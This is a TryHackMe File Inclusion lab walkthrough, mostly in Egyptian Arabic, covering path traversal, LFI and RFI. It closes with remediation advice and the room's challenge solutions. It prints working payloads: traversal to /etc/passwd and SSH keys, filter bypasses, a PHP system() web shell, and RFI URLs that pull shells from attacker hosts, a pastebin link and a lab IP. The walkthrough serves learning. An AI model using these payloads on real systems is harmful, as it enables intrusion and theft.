# TryHackMe File Inclusion walkthrough

<img width="1905" height="379" alt="image" src="https://github.com/user-attachments/assets/bff11430-8522-4a0c-b812-bcd827f3ed37" />

---


<details>
  <summary>Introduction</summary>


🧠 يعني إيه File Inclusion؟
===========================

**File Inclusion = إنك تتحكم في ملف السيرفر هيعرضه أو يشغّله**

📌 ببساطة:

> السيرفر بيسمح لليوزر يحدد اسم ملف\
> وإنت كمهاجم تستغل ده 😈

* * * * *

💡 مثال بسيط:
-------------

```
http://site.com/get.php?file=userCV.pdf
```

👀 هنا:

-   `file` = parameter
-   `userCV.pdf` = الملف اللي هيتفتح

* * * * *

💥 المشكلة فين؟
---------------

لو الكود كده:

```
include($_GET['file']);
```

❌ مفيش validation

👉 يعني إنت تقدر تبعت أي حاجة مش بس PDF

* * * * *

🌐 إزاي الثغرة بتحصل؟
=====================

السبب الرئيسي:
--------------

> ❗ **Input Validation ضعيف أو مش موجود**

📌 السيرفر:

-   بيثق في user input
-   مبيفلترش
-   مبيمنعش paths خطيرة

* * * * *

🧠 السيناريو:
-------------

1.  اليوزر يطلب ملف
2.  السيرفر ياخد الاسم من URL
3.  يفتح الملف مباشرة

💣 هنا بقى:

> تقدر تغيّر اسم الملف لأي حاجة

* * * * *

🔥 أنواع File Inclusion
=======================

🔓 1. Local File Inclusion (LFI)
--------------------------------

**إنك تقرأ ملفات من السيرفر نفسه**

* * * * *

### 🎯 مثال:

```
?page=../../../../etc/passwd
```

📂 النتيجة:

```
root:x:0:0:root:/root:/usr/bin/zsh

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

bin:x:2:2:bin:/bin:/usr/sbin/nologin

sys:x:3:3:sys:/dev:/usr/sbin/nologin

sync:x:4:65534:sync:/bin:/bin/sync

games:x:5:60:games:/usr/games:/usr/sbin/nologin

man:x:6:12:man:/var/cache/man:/usr/sbin/nologin

lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin

mail:x:8:8:mail:/var/mail:/usr/sbin/nologin

news:x:9:9:news:/var/spool/news:/usr/sbin/nologin

uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin

proxy:x:13:13:proxy:/bin:/usr/sbin/nologin

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

backup:x:34:34:backup:/var/backups:/usr/sbin/nologin

list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin

irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin

_apt:x:42:65534::/nonexistent:/usr/sbin/nologin

nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin

systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin

systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin

messagebus:x:100:107::/nonexistent:/usr/sbin/nologin

tss:x:101:109:TPM software stack,,,:/var/lib/tpm:/bin/false
```


💥 بتشوف:

-   users
-   system accounts

* * * * *

🌍 2. Remote File Inclusion (RFI)
---------------------------------

**إنك تخلي السيرفر يشغل ملف من عندك**

* * * * *

### 🎯 مثال:

```
?page=http://attacker.com/shell.txt
```

💣 السيرفر:

-   يحمل الملف
-   ينفذه

👉 دي ممكن توصلك لـ **RCE (Remote Code Execution)** 😈

* * * * *

🧭 3. Directory Traversal
-------------------------

**إنك تخرج بره الفولدر المسموح بيه**

* * * * *

### 🎯 مثال:

```
?page=../../../../etc/passwd
```

📌 `../` = اطلع لفوق في الفولدر

* * * * *

💣 المخاطر (ليه خطيرة؟)
=======================

😈 1. Data Leakage
------------------

-   ملفات سيستم
-   سورس كود
-   credentials

* * * * *

🔐 2. كشف معلومات حساسة
-----------------------

-   config files
-   database passwords

* * * * *

💥 3. Remote Code Execution (أخطر حاجة)
---------------------------------------

لو قدرت:

-   ترفع ملف
-   وبعدين تعمل include

👉 تبقى سيطرت على السيرفر بالكامل

* * * * *

⚡ مثال هجوم كامل
================

1.  تلاقي LFI
2.  ترفع shell (بأي طريقة)
3.  تعمل include للملف

💣 Boom → RCE

* * * * *

🛡️ الحماية (عشان تفهمها وتكسرها 😎)
====================================

✅ Input Validation
------------------

-   تمنع `../`
-   تسمح بس ملفات معينة

* * * * *

✅ Whitelisting
--------------

```
$allowed = ['home.php', 'about.php'];
```

* * * * *

✅ Disable RFI
-------------

allow_url_include = Off


  
</details>



<details>
  <summary>Path Traversal</summary>


🧠 يعني إيه Path Traversal؟
===========================

**Path Traversal = إنك تخرج من الفولدر المسموح وتدخل على ملفات السيستم**

📌 السيرفر بيقولك:

> "خد ملفات من فولدر معين"

وإنت ترد عليه:

> "لا، أنا عايز ملفات تانية خالص 😈"

* * * * *

💡 مثال طبيعي (Normal Behavior)
-------------------------------

```
http://webapp.thm/get.php?file=userCV.pdf
```

📂 السيرفر يروح هنا:

```
/var/www/app/CVs/userCV.pdf
```

✔️ كله تمام

* * * * *

💣 الهجوم (Attack)
==================

👀 تستخدم:
----------

```
../
```

📌 معناها:

> اطلع فولدر لفوق

* * * * *

🎯 Payload:
-----------

```
http://webapp.thm/get.php?file=../../../../etc/passwd
```

* * * * *

🧠 بيحصل إيه؟
-------------

```
/var/www/app/CVs/\
 ↑\
../ → /var/www/app/\
../ → /var/www/\
../ → /var/\
../ → /
```

💥 وصلت للـ root `/`

وبعدين:

```
/etc/passwd
```

* * * * *

📂 النتيجة:
-----------



💣 السيرفر يرجعلك:

-   users
-   system info

* * * * *

⚠️ ليه الثغرة بتحصل؟
====================

السبب الرئيسي:
--------------

> ❗ مفيش Input Validation

📌 الكود بيبقى كده:

```
file_get_contents($_GET['file']);
```

👀 السيرفر:

-   بياخد input
-   ينفذه مباشرة

💥 من غير فلترة → انت تتحكم

* * * * *

🧭 على Windows كمان
===================

🎯 مثال:
--------

```
http://webapp.thm/get.php?file=../../../../boot.ini
```

أو:

```
../../../../windows/win.ini
```

📌 نفس الفكرة:

-   تطلع لفوق
-   تدخل على ملفات النظام

* * * * *

🔥 ملفات مهمة تجربها (Gold Mine 💣)
===================================

🐧 Linux:
---------

-   `/etc/passwd` → users
-   `/etc/shadow` → passwords (لو permission يسمح)
-   `/proc/version` → kernel version
-   `/var/log/apache2/access.log` → logs
-   `/root/.ssh/id_rsa` → SSH private key 🔑

* * * * *

🪟 Windows:
-----------

-   `C:\boot.ini`
-   `C:\Windows\win.ini`



<img width="1575" height="191" alt="image" src="https://github.com/user-attachments/assets/19d369ff-5844-4ab7-a5e1-fa4f303a5e8b" />


  
</details>




<details>
  <summary>Local File Inclusion - LFI</summary>



🧠 يعني إيه LFI؟
================

**LFI = إنك تخلي السيرفر يعمل include لملف من عنده (local)**

📌 الفرق عن Path Traversal:

-   Path Traversal → قراءة ملف بس
-   LFI → ممكن **قراءة + تنفيذ كود** 😈

* * * * *

💻 الكود الأول (أسهل سيناريو)
=============================

```
<?PHP\
  include($_GET["lang"]);\
?>
```

* * * * *

🎯 الاستخدام الطبيعي:
---------------------

```
?lang=EN.php\
?lang=AR.php
```

📌 السيرفر يفتح:

-   EN.php
-   AR.php

* * * * *

💣 المشكلة:
-----------

❌ مفيش validation

👉 يعني تقدر تتحكم في `lang`

* * * * *

🔥 الهجوم:
----------

```
?lang=/etc/passwd
```


* * * * *

📂 النتيجة:
-----------


4

💥 السيرفر يقرأ الملف ويعرضه

* * * * *

🧠 ليه ده حصل؟
--------------

-   include بياخد input مباشر
-   مفيش restriction
-   تقدر تحط أي path

* * * * *

🧱 الكود التاني (Developer حاول يأمّن 😏)
=========================================


```
<?PHP\
  include("languages/"  .  $_GET['lang']);\
?>
```

* * * * *

🎯 الاستخدام الطبيعي:
---------------------

```
?lang=EN.php
```

📌 السيرفر يروح:

```
languages/EN.php
```

* * * * *

💣 هل ده آمن؟ لأ 😈
===================

🎯 الهجوم:
----------

```
?lang=../../../../etc/passwd
```

* * * * *

🧠 بيحصل إيه؟
-------------

```
languages/\
 ↑\
../../../../ → تطلع لفوق لحد root
```

💥 وتوصل لـ:

```
/etc/passwd
```

* * * * *

📂 النتيجة:
-----------

```

root:x:0:0:root:/root:/usr/bin/zsh

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

bin:x:2:2:bin:/bin:/usr/sbin/nologin

sys:x:3:3:sys:/dev:/usr/sbin/nologin

sync:x:4:65534:sync:/bin:/bin/sync

games:x:5:60:games:/usr/games:/usr/sbin/nologin

man:x:6:12:man:/var/cache/man:/usr/sbin/nologin

lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin

```



* * * * *

🔥 الفرق المهم جدًا
===================

| الحالة | النتيجة |
| --- | --- |
| include مباشر | أي ملف بسهولة |
| include + folder | تستخدم `../` للهروب |

* * * * *

💣 ليه LFI أخطر من Path Traversal؟
==================================

😈 لأنك ممكن تعمل:
------------------

### 1\. 📖 قراءة ملفات

-   `/etc/passwd`
-   config files

* * * * *

### 2\. 🔥 Code Execution (RCE)

👀 إزاي؟

#### مثال:

لو السيرفر بيسجل logs فيها input منك:

```
<?php  system($_GET['cmd']); ?>
```

وبعدين تعمل:

```
?lang=/var/log/apache2/access.log
```

💣 السيرفر ينفذ الكود 😈

* * * * *

🧠 تفكير ال Pentester
=====================

لما تلاقي:
----------

```
include(\
require(\
file=\
page=\
lang=
```


💡 تفكر فورًا:

> "هل أقدر أعمل LFI؟"

* * * * *

🧪 Payloads أساسية:
-------------------

```
/etc/passwd\
../../../../etc/passwd
```

* * * * *

🔥 Bypass filters:
------------------

```
....//....//etc/passwd\
..%2f..%2fetc/passwd
```

----
----

```
http://10.128.169.184/lab1.php?file=/etc/passwd
```

<img width="1502" height="706" alt="image" src="https://github.com/user-attachments/assets/6f85926f-94c6-4724-b9e3-bfbcd9f15a33" />

```
http://10.128.169.184/lab2.php?file=welsdfocme.php
```

<img width="1668" height="749" alt="image" src="https://github.com/user-attachments/assets/6e9f729a-ac78-4a00-b310-c0317cc1e54d" />



  
</details>



<details>
  <summary>Local File Inclusion - LFI Continued</summary>



🧠 #3 -- Black Box + Error-Based Discovery
=========================================

💡 الفكرة:
----------

إنت **مش شايف الكود** → بس الـ **error بيفضح كل حاجة** 😈

* * * * *

❗ الرسالة:
----------


```
include(languages/THM.php)
```

📌 استنتجنا:

-   فيه folder اسمه `languages/`
-   فيه `.php` بتضاف تلقائي

* * * * *

💣 المشكلة:
-----------

```
?lang=../../../../etc/passwd
```

❌ بيفشل ليه؟

```
/etc/passwd.php
```

👀 السيرفر بيضيف `.php` غصب عنه

* * * * *

🔥 الحل: Null Byte
------------------

```
?lang=../../../../etc/passwd%00
```

📌 `%00` = نهاية string

💣 يخلي:

```
/etc/passwd
```

بدل:

```
/etc/passwd.php
```

* * * * *

⚠️ مهم:
-------

-   شغال في PHP قديم
-   مش شغال في الجديد

* * * * *

🧠 #4 -- Filter على `/etc/passwd`
================================

💡 المشكلة:
-----------

السيرفر مانع الكلمة مباشرة

* * * * *

🔥 bypass 1:
------------

```
/etc/passwd%00
```

* * * * *

🔥 bypass 2 (أهم):
------------------

```
/etc/passwd/.
```

* * * * *

🧠 ليه ده شغال؟
---------------

📌 لأن:

```
/etc/passwd/. = /etc/passwd
```

✔️ نفس الملف\
❌ بس الفلتر مش شايفه

* * * * *

💡 كمان:
--------
```
/etc/passwd/..
```
= `/etc/`

* * * * *

🧠 #5 -- إزالة ../ من input
==========================

❗ السيرفر بيعمل:
----------------

```
../ → (empty)
```

* * * * *

💣 Payload العادي:
------------------

```
../../../../etc/passwd
```

❌ يتحول لـ:

```
etc/passwd
```

* * * * *

🔥 الحل (Bypass جامد 👀):
-------------------------

```
....//....//....//....//etc/passwd
```

* * * * *

🧠 ليه شغال؟
------------

📌 السيرفر:

-   يشيل أول `../` بس
-   يسيب الباقي

💥 فالناتج النهائي يرجع traversal تاني 😈

* * * * *

🧠 #6 -- Forced Directory
========================

💡 الحالة:
----------

```
?lang=languages/EN.php
```

📌 لازم تكتب `languages/`

* * * * *

💣 الحل:
--------

```
?lang=languages/../../../../etc/passwd
```

* * * * *

🧠 الفكرة:
----------

-   تحافظ على الشكل اللي هو عايزه
-   وفي نفس الوقت تهرب 😈

* * * * *

🔥 ملخص (Cheat Sheet 💣)
===============================

لما تلاقي LFI:
--------------

### 🎯 مشاكل ممكن تقابلك:

| المشكلة | الحل |
| --- | --- |
| فيه `.php` | `%00` |
| keyword متفلتر | `/./` |
| `../` متشال | `....//` |
| لازم directory | ضيفه في payload |




---
---
---


```
http://10.128.169.184/lab3.php?file=../../../../../etc/passwd%00
```

<img width="1423" height="739" alt="image" src="https://github.com/user-attachments/assets/5724d1a2-114b-44a3-ab62-ac26c62548d1" />

```
http://10.128.169.184/lab6.php?file=THM-profile../../../../../etc/passwd
```

<img width="1468" height="736" alt="image" src="https://github.com/user-attachments/assets/a4ce1b0a-ec9e-4bfe-be1f-9f7336d23ae5" />


```
http://10.128.169.184/lab6.php?file=THM-profile../../../../../etc/os-release
```

<img width="1423" height="630" alt="image" src="https://github.com/user-attachments/assets/71de2e9f-0387-4101-a9b3-e5258db779b4" />

<img width="1603" height="574" alt="image" src="https://github.com/user-attachments/assets/1edb35f0-e4e3-4795-a1b2-7bcfc9a95168" />


  
</details>



<details>
  <summary>Remote File Inclusion - RFI</summary>


🧠 يعني إيه RFI؟
================

**RFI = إنك تخلي السيرفر يحمّل وينفّذ ملف من سيرفر خارجي (بتاعك)**

📌 بدل ما تقول للسيرفر:

> افتح ملف من عندك

بتقوله:

> روح هات ملف من عندي أنا 😈

* * * * *

💻 مثال على الكود الضعيف
========================

```
include($_GET['lang']);
```

* * * * *

🎯 الاستخدام الطبيعي:
---------------------

```
?lang=EN.php
```

* * * * *

💣 الهجوم (RFI)
===============

👨‍💻 Step 1: تجهّز ملف خبيث عندك
---------------------------------

```
<?php  echo  "Hello THM"; ?>
```

ترفعه على سيرفر بتاعك:

```
http://attacker.thm/cmd.txt
```

* * * * *

👾 Step 2: تبعته للضحية
-----------------------

```
http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt
```

* * * * *

🧠 بيحصل إيه؟
-------------

1.  السيرفر يشوف input
2.  يروح يطلب الملف من attacker server
3.  يعمل include
4.  ينفّذ الكود 💥

* * * * *

📂 النتيجة:
-----------


4

💥 الصفحة تعرض:

```
Hello THM
```

* * * * *

⚠️ شرط مهم جدًا
===============

لازم يكون:

```
allow_url_fopen = On
```

وأحيانًا:

```
allow_url_include = On
```

❌ لو Off → الهجوم مش هيشتغل

* * * * *

🔥 ليه RFI أخطر من LFI؟
=======================

😈 تقدر تعمل:
-------------

### 1\. 💣 Remote Command Execution

```
<?php  system($_GET['cmd']); ?>
```

وبعدين:

```
?lang=http://attacker.thm/shell.php&cmd=whoami
```

💥 بقى عندك shell 😈

* * * * *

### 2\. 📖 سرقة بيانات

-   config files
-   credentials

* * * * *

### 3\. 🌐 XSS / Defacement

-   تغير شكل الموقع
-   inject scripts

* * * * *

### 4\. 💥 DoS

-   تعمل load عالي
-   توقف السيرفر





---
---

## open [pastebin](https://pastebin.com/)

> ### create new paste and wirte in it 

```
<?php  system($_GET['cmd']); ?>
```

<img width="1424" height="796" alt="image" src="https://github.com/user-attachments/assets/00a7b902-415c-4df5-bbf8-2e129a7c4784" />

## copy raw link 

```
https://pastebin.com/raw/kKsppG45
```

```
http://10.128.169.184/playground.php?file=https://pastebin.com/raw/kKsppG45&cmd=whoami
```

# or 


<img width="1491" height="374" alt="image" src="https://github.com/user-attachments/assets/d78f54a2-f0c2-4355-8bf3-fccce4ac32b7" />


```
http://10.128.169.184/lab1.php?file=http://192.168.139.157:8888/shell.php&cmd=id
```





  
</details>



<details>
  <summary>Remediation</summary>



🛡️ 1. تحديث السيستم والخدمات
=============================

💡 الفكرة:
----------

> أي Version قديم = ثغرات معروفة 😈

📌 ليه مهم؟

-   PHP القديم كان فيه مشاكل زي **Null Byte (%00)**
-   frameworks القديمة فيها bypasses جاهزة

✅ الحل:

-   دايمًا update
-   استخدم versions حديثة

* * * * *

🛡️ 2. إغلاق رسائل الخطأ (Error Messages)
=========================================

💣 المشكلة:
-----------

زي اللي شوفناه قبل كده:

```
include(languages/THM.php)\
in /var/www/html/THM-4/
```

👀 ده كشف:

-   path كامل
-   اسم الفولدر
-   طريقة الكود

* * * * *

✅ الحل:
-------

```
display_errors = Off
```

📌 أو في PHP:

```
error_reporting(0);
```

* * * * *

🧠 ليه مهم؟
-----------

> الهاكر بيعتمد على error عشان يفهم السيستم

* * * * *

🛡️ 3. استخدام WAF
==================

💡 WAF = Web Application Firewall
---------------------------------

📌 بيقف بين:

-   اليوزر
-   السيرفر

* * * * *

💣 يمنع:
--------

-   `../`
-   `etc/passwd`
-   payloads المعروفة

* * * * *

🧠 مثال:
--------

لو حد بعت:

```
../../../../etc/passwd
```

🛑 WAF يمنعها

* * * * *

🛡️ 4. تعطيل خصائص PHP الخطيرة
==============================

❗ أهم حاجتين:
-------------

```
allow_url_fopen = Off\
allow_url_include = Off
```

* * * * *

💣 ليه؟
-------

-   دول اللي بيسمحوا بـ **RFI**
-   من غيرهم → مفيش include من الإنترنت

* * * * *

🛡️ 5. التحكم في الـ Protocols & Wrappers
=========================================

💡 المشكلة:
-----------

PHP فيه حاجات زي:

```
php://filter\
data://\
file://
```

* * * * *

💣 دي بتتستخدم في bypass
------------------------

مثلاً:

```
php://filter/convert.base64-encode/resource=index.php
```

* * * * *

✅ الحل:
-------

-   اقفل اللي مش محتاجه
-   راقب الاستخدام

* * * * *

🛡️ 6. عدم الثقة في user input
==============================

❗ أهم قاعدة في السيكيوريتي:
---------------------------

> NEVER TRUST USER INPUT 😈

* * * * *

💣 الكود الغلط:
---------------

```
include($_GET['file']);
```

* * * * *

✅ الصح:
-------

### ✔️ Validation:

```
if(!preg_match('/^[a-zA-Z0-9]+$/', $file)) die("Invalid");
```

* * * * *

🛡️ 7. Whitelisting (أهم نقطة 🔥)
=================================

💡 الفكرة:
----------

بدل ما تقول "امنع الوحش"\
قول "اسمح بالكويس بس"

* * * * *

❌ Blacklist:
------------

منع ../

💥 بيتعمله bypass

* * * * *

✅ Whitelist:
------------

```
$allowed = ["EN.php", "AR.php"];

if(in_array($_GET['lang'], $allowed)){\
 include($_GET['lang']);\
}
```

* * * * *

🧠 ليه ده أقوى؟
---------------

> الهاكر مش هيقدر يدخل أي حاجة خارج اللي انت محدده

* * * * *

🔥 الخلاصة 
=======================

| الطريقة | الهدف |
| --- | --- |
| Update | تقفل ثغرات قديمة |
| Hide Errors | تمنع كشف السيستم |
| WAF | يوقف الهجوم قبل ما يوصل |
| Disable URL include | تمنع RFI |
| Control wrappers | تمنع bypass |
| Validate input | تمنع التلاعب |
| Whitelist | 🔥 أقوى حماية |


  
</details>




<details>
  <summary>challenge</summary>


## flag 1

<img width="1516" height="645" alt="image" src="https://github.com/user-attachments/assets/0319da39-3cbe-4e51-9715-4ea3501d5743" />

## flag 2

> ## first change cookie to admin to get the flag 

<img width="1887" height="636" alt="image" src="https://github.com/user-attachments/assets/e7418d48-eb77-40a4-b73b-fe22f91ede21" />

##

<img width="1514" height="589" alt="image" src="https://github.com/user-attachments/assets/1baa7163-a87d-4aa2-abce-0360dd57d042" />

## pybass it 

```
Cookie: THM=admin../../../../../../../etc/flag2%00
```

<img width="1502" height="628" alt="image" src="https://github.com/user-attachments/assets/d464721f-dadf-464a-9887-a9feb28cdedb" />


# flag 3 

```
file=../../../../../etc/flag3%00
```

<img width="1488" height="618" alt="image" src="https://github.com/user-attachments/assets/d3a1376e-a965-4590-8cef-eb3f44e385dc" />


## **`RCE`**

```
http://10.128.169.184/playground.php?file=http://192.168.139.157:8888/shell.php&cmd=hostname
```

<img width="1519" height="637" alt="image" src="https://github.com/user-attachments/assets/33628e6e-434a-42d6-8146-f048c4d0b949" />





  
</details>






































